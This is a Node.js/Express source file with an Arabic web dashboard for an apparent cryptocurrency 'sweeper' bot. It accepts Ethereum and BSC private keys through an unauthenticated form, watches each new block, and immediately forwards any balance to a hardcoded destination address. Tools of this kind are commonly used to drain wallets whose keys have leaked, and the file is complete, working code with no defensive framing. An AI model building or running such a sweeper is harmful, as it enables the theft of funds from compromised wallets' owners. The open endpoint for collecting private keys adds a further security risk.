const { ethers } = require('ethers');
const express = require('express');

process.on('uncaughtException', (error) => {
  console.error('❌ خطأ غير معالج:', error.message);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Promise مرفوض:', reason);
});

const DESTINATION_ADDRESS = process.env.DESTINATION_ADDRESS || '0x9e47977653b80aA0D3a965Fb66369e2d0bAfB243';

const RPC_URLS = {
  wallet1: {
    eth: process.env.ETH_URL1,
    bsc: process.env.BSC_URL1
  },
  wallet2: {
    eth: process.env.ETH_URL2,
    bsc: process.env.BSC_URL2
  }
};

class CryptoSweeperMonitor {
  constructor() {
    this.notifications = [];
    this.wallets = [];
    this.maxWallets = 0;
    
    if (RPC_URLS.wallet1.eth && RPC_URLS.wallet1.bsc) this.maxWallets = 1;
    if (RPC_URLS.wallet2.eth && RPC_URLS.wallet2.bsc) this.maxWallets = 2;
    
    if (this.maxWallets === 0) {
      this.addNotification('❌ خطأ: يجب تعيين ETH_URL1 و BSC_URL1 في متغيرات البيئة', 'error');
    } else {
      this.addNotification(`✅ يمكنك إضافة حتى ${this.maxWallets} محفظة`, 'info');
    }
  }
  
  addNotification(message, type = 'info') {
    const notification = {
      id: Date.now(),
      message,
      type,
      timestamp: new Date().toISOString()
    };
    this.notifications.unshift(notification);
    
    if (this.notifications.length > 50) {
      this.notifications = this.notifications.slice(0, 50);
    }
    
    console.log(`[${type.toUpperCase()}] ${message}`);
  }
  
  async sweepNetwork(providerUrl, networkName, chainId, walletObj, walletIndex) {
    const ignoredBalances = new Map();
    let isSending = false;
    
    try {
      this.addNotification(`🔗 [محفظة ${walletIndex}] الاتصال بـ ${networkName}...`, 'info');
      
      const provider = new ethers.WebSocketProvider(providerUrl);
      provider.on('error', () => {});
      
      await new Promise((resolve) => setTimeout(resolve, 200));
      
      if (provider._websocket) {
        provider._websocket.removeAllListeners('error');
        provider._websocket.on('error', () => {});
      }
      
      const wallet = walletObj.wallet.connect(provider);
      
      this.addNotification(`✅ [محفظة ${walletIndex}] ${networkName} متصل`, 'success');
      
      const checkBalance = async () => {
        try {
          const balance = await provider.getBalance(walletObj.address);
          return balance;
        } catch (error) {
          return 0n;
        }
      };
      
      const initialBalance = await checkBalance();
      if (initialBalance > 0n) {
        const balanceKey = initialBalance.toString();
        if (!ignoredBalances.has(balanceKey) && !isSending) {
          this.addNotification(`💰 [محفظة ${walletIndex}][${networkName}] رصيد: ${ethers.formatEther(initialBalance)}`, 'info');
          await this.forwardFunds(provider, wallet, initialBalance, networkName, chainId, ignoredBalances, () => isSending, (val) => isSending = val, walletIndex);
        }
      }
      
      provider.on('block', async (blockNumber) => {
        try {
          const balance = await checkBalance();
          
          if (balance > 0n) {
            const balanceKey = balance.toString();
            
            if (ignoredBalances.has(balanceKey) || isSending) {
              return;
            }
            
            this.addNotification(`💰 [محفظة ${walletIndex}][${networkName}] رصيد جديد! ${ethers.formatEther(balance)}`, 'success');
            
            await this.forwardFunds(provider, wallet, balance, networkName, chainId, ignoredBalances, () => isSending, (val) => isSending = val, walletIndex);
          }
        } catch (error) {
          console.error(`❌ خطأ في البلوك ${blockNumber}:`, error.message);
        }
      });
      
      walletObj.networks.push({ provider, networkName, chainId });
      
    } catch (error) {
      this.addNotification(`❌ [محفظة ${walletIndex}] فشل ${networkName}: ${error.message}`, 'error');
    }
  }
  
  async forwardFunds(provider, wallet, balance, networkName, chainId, ignoredBalances, getSending, setSending, walletIndex) {
    try {
      const startTime = Date.now();
      
      const feeData = await provider.getFeeData();
      const gasLimit = 21000n;
      
      let maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice;
      let maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || 0n;
      
      if (!maxFeePerGas) {
        maxFeePerGas = ethers.parseUnits('5', 'gwei');
      }
      
      const estimatedFee = gasLimit * maxFeePerGas;
      
      if (balance <= estimatedFee) {
        this.addNotification(`⚠️ [محفظة ${walletIndex}][${networkName}] المبلغ قليل`, 'warning');
        ignoredBalances.set(balance.toString(), true);
        return false;
      }
      
      const amountToSend = balance - estimatedFee;
      
      setSending(true);
      
      const tx = {
        to: DESTINATION_ADDRESS,
        value: amountToSend,
        gasLimit: gasLimit,
        maxFeePerGas: maxFeePerGas,
        maxPriorityFeePerGas: maxPriorityFeePerGas || maxFeePerGas,
        chainId: chainId
      };
      
      const sentTx = await wallet.sendTransaction(tx);
      const executionTime = Date.now() - startTime;
      
      this.addNotification(`📤 [محفظة ${walletIndex}][${networkName}] إرسال ${ethers.formatEther(amountToSend)} (${executionTime}ms)`, 'info');
      
      await sentTx.wait();
      
      const explorerUrl = networkName === 'Ethereum' 
        ? `https://etherscan.io/tx/${sentTx.hash}`
        : `https://bscscan.com/tx/${sentTx.hash}`;
      
      this.addNotification(`✅ [محفظة ${walletIndex}][${networkName}] تم! ${ethers.formatEther(amountToSend)}\n${explorerUrl}`, 'success');
      
      setSending(false);
      return true;
      
    } catch (error) {
      setSending(false);
      this.addNotification(`❌ [محفظة ${walletIndex}][${networkName}] خطأ: ${error.message}`, 'error');
      return false;
    }
  }
  
  addWallet(privateKey) {
    try {
      if (this.maxWallets === 0) {
        return { success: false, message: 'لا توجد روابط RPC متاحة في متغيرات البيئة' };
      }
      
      if (this.wallets.length >= this.maxWallets) {
        return { success: false, message: `تم الوصول للحد الأقصى (${this.maxWallets} محفظة)` };
      }
      
      const wallet = new ethers.Wallet(privateKey);
      const walletIndex = this.wallets.length + 1;
      
      const rpcUrls = walletIndex === 1 ? RPC_URLS.wallet1 : RPC_URLS.wallet2;
      
      const walletObj = {
        wallet: wallet,
        address: wallet.address,
        networks: [],
        index: walletIndex
      };
      
      this.wallets.push(walletObj);
      
      this.addNotification(`✅ محفظة ${walletIndex} مضافة: ${wallet.address}`, 'success');
      
      this.startMonitoringWallet(walletObj, rpcUrls);
      
      return { success: true, message: `تم إضافة المحفظة ${walletIndex}` };
    } catch (error) {
      this.addNotification(`❌ خطأ في إضافة المحفظة: ${error.message}`, 'error');
      return { success: false, message: error.message };
    }
  }
  
  async startMonitoringWallet(walletObj, rpcUrls) {
    this.addNotification(`🚀 بدء مراقبة المحفظة ${walletObj.index}`, 'info');
    
    await Promise.all([
      this.sweepNetwork(rpcUrls.eth, 'Ethereum', 1, walletObj, walletObj.index),
      this.sweepNetwork(rpcUrls.bsc, 'BSC', 56, walletObj, walletObj.index)
    ]);
  }
  
  stopAllMonitoring() {
    for (const walletObj of this.wallets) {
      for (const network of walletObj.networks) {
        try {
          if (network.provider && network.provider.destroy) {
            network.provider.destroy();
          }
        } catch (error) {
          console.error('Error stopping network:', error.message);
        }
      }
    }
    
    this.wallets = [];
    this.addNotification('🛑 تم إيقاف جميع المحافظ', 'warning');
    
    console.log('🛑 All monitoring stopped');
  }
  
  getStatus() {
    let status = `📊 حالة المراقبة\n\n`;
    status += `🎯 الوجهة: ${DESTINATION_ADDRESS}\n`;
    status += `📈 المحافظ النشطة: ${this.wallets.length}/${this.maxWallets}\n\n`;
    
    for (const walletObj of this.wallets) {
      status += `💼 محفظة ${walletObj.index}:\n`;
      status += `   ${walletObj.address}\n`;
      status += `   شبكات: ${walletObj.networks.length}\n\n`;
    }
    
    return status;
  }
}

const monitor = new CryptoSweeperMonitor();

const app = express();
const PORT = 5000;

app.use(express.json());
app.use((req, res, next) => {
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  next();
});

app.get('/', (req, res) => {
  const html = `<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مراقب ETH/BSC</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 8px;
            overflow-x: hidden;
        }
        .container {
            max-width: 1200px;
            width: 100%;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 18px 12px;
            text-align: center;
        }
        .header h1 { font-size: 1.4rem; margin-bottom: 5px; }
        .header p { font-size: 0.8rem; line-height: 1.3; }
        .main-content {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
            padding: 12px;
        }
        .card {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            padding: 12px;
            width: 100%;
        }
        .card h2 { color: #495057; margin-bottom: 12px; font-size: 1.1rem; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: transform 0.2s;
        }
        .btn:active { transform: scale(0.98); }
        .status-display {
            background: white;
            border-radius: 10px;
            padding: 12px;
            font-family: monospace;
            font-size: 11px;
            white-space: pre-wrap;
            max-height: 250px;
            overflow-y: auto;
            border: 2px solid #e9ecef;
            margin-top: 10px;
            line-height: 1.4;
        }
        .notifications {
            background: white;
            border-radius: 10px;
            padding: 10px;
            max-height: 400px;
            overflow-y: auto;
            overflow-x: hidden;
            border: 2px solid #e9ecef;
        }
        .notification {
            padding: 8px;
            margin-bottom: 6px;
            border-radius: 6px;
            font-size: 11px;
            border-right: 3px solid #667eea;
            word-wrap: break-word;
            overflow-wrap: break-word;
            max-width: 100%;
        }
        .notification.success { background: #d4edda; border-color: #28a745; }
        .notification.error { background: #f8d7da; border-color: #dc3545; }
        .notification.warning { background: #fff3cd; border-color: #ffc107; }
        .notification.info { background: #d1ecf1; border-color: #17a2b8; }
        .timestamp { font-size: 10px; color: #6c757d; margin-top: 4px; }
        textarea {
            width: 100%;
            max-width: 100%;
            padding: 10px;
            border: 2px solid #dee2e6;
            border-radius: 8px;
            font-size: 12px;
            resize: vertical;
            min-height: 65px;
            font-family: monospace;
            direction: ltr;
            text-align: left;
            box-sizing: border-box;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 مراقب ETH/BSC</h1>
            <p>مراقبة وتحويل تلقائي لـ Ethereum و Binance Smart Chain</p>
        </div>
        
        <div class="main-content">
            <div class="card">
                <h2>📝 إضافة محفظة</h2>
                <textarea id="newPrivateKey" placeholder="المفتاح الخاص للمحفظة"></textarea>
                <button class="btn" onclick="addWallet()">إضافة محفظة</button>
            </div>
            
            <div class="card">
                <h2>🔔 الإشعارات</h2>
                <div class="notifications" id="notifications">
                    <div class="notification info">
                        <div>مرحباً!</div>
                        <div class="timestamp">${new Date().toLocaleString('ar-EG')}</div>
                    </div>
                </div>
            </div>
            
            <div class="card">
                <h2>📊 حالة الشبكات</h2>
                <button class="btn" onclick="loadStatus()">تحديث الحالة</button>
                <div class="status-display" id="statusDisplay">اضغط للتحديث</div>
            </div>
            
            <div class="card">
                <h2>⏹️ إيقاف المراقبة</h2>
                <button class="btn" onclick="stopMonitoring()" style="background: linear-gradient(45deg, #dc3545, #c82333);">إيقاف جميع المحافظ</button>
            </div>
        </div>
    </div>
    
    <script>
        setInterval(loadNotifications, 3000);
        
        async function loadNotifications() {
            try {
                const response = await fetch('/api/notifications');
                const notifications = await response.json();
                const container = document.getElementById('notifications');
                
                if (notifications.length === 0) {
                    container.innerHTML = '<div class="notification info">لا توجد إشعارات</div>';
                    return;
                }
                
                container.innerHTML = notifications.map(n => 
                    \`<div class="notification \${n.type}">
                        <div>\${n.message}</div>
                        <div class="timestamp">\${new Date(n.timestamp).toLocaleString('ar-EG')}</div>
                    </div>\`
                ).join('');
            } catch (error) {
                console.error('Error:', error);
            }
        }
        
        async function loadStatus() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();
                document.getElementById('statusDisplay').textContent = data.status;
            } catch (error) {
                document.getElementById('statusDisplay').textContent = 'خطأ في التحميل';
            }
        }
        
        async function stopMonitoring() {
            if (!confirm('هل أنت متأكد من إيقاف جميع المحافظ؟')) {
                return;
            }
            
            try {
                const response = await fetch('/api/stop', { method: 'POST' });
                const result = await response.json();
                alert(result.message);
                loadStatus();
            } catch (error) {
                alert('خطأ: ' + error.message);
            }
        }
        
        async function addWallet() {
            const privateKey = document.getElementById('newPrivateKey').value.trim();
            
            if (!privateKey) {
                alert('الرجاء إدخال المفتاح الخاص');
                return;
            }
            
            try {
                const response = await fetch('/api/add-wallet', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ privateKey })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    document.getElementById('newPrivateKey').value = '';
                    alert(result.message);
                    loadStatus();
                } else {
                    alert('خطأ: ' + result.message);
                }
            } catch (error) {
                alert('خطأ: ' + error.message);
            }
        }
        
        loadNotifications();
        loadStatus();
    </script>
</body>
</html>`;
  res.send(html);
});

app.get('/api/notifications', (req, res) => {
  res.json(monitor.notifications);
});

app.get('/api/status', (req, res) => {
  res.json({ status: monitor.getStatus() });
});

app.post('/api/stop', (req, res) => {
  monitor.stopAllMonitoring();
  res.json({ success: true, message: 'تم إيقاف جميع المحافظ' });
});

app.post('/api/add-wallet', (req, res) => {
  const { privateKey } = req.body;
  if (!privateKey) {
    return res.json({ success: false, message: 'الرجاء إدخال المفتاح الخاص' });
  }
  const result = monitor.addWallet(privateKey);
  res.json(result);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🌐 Web interface: http://localhost:${PORT}`);
  console.log('✅ الخادم جاهز');
});
